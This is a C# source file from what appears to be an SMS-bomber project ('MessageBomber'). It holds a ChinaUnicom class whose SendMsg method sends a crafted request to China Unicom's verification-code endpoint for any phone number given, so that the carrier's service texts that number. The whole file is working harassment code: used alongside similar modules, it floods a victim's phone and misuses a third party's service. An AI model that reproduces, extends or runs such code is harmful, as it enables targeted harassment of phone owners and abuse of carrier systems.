using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using TracySecretTool.Tools;

namespace MessageBomber.Server
{
    public class ChinaUnicom
    {
        public bool SendMsg(string phone)
        {
            string time = DateTime.Now.ToUnixTime13();
            string url = "https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17202998926796683412_" + DateTime.Now.AddMinutes(-2).ToUnixTime13() + "&req_time=" + time + "&mobile=" + phone + "&_=" + time;
            string response = WebRequestHelper.HttpPost(url, new CookieContainer());

            if (response.Contains("\"0000\""))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
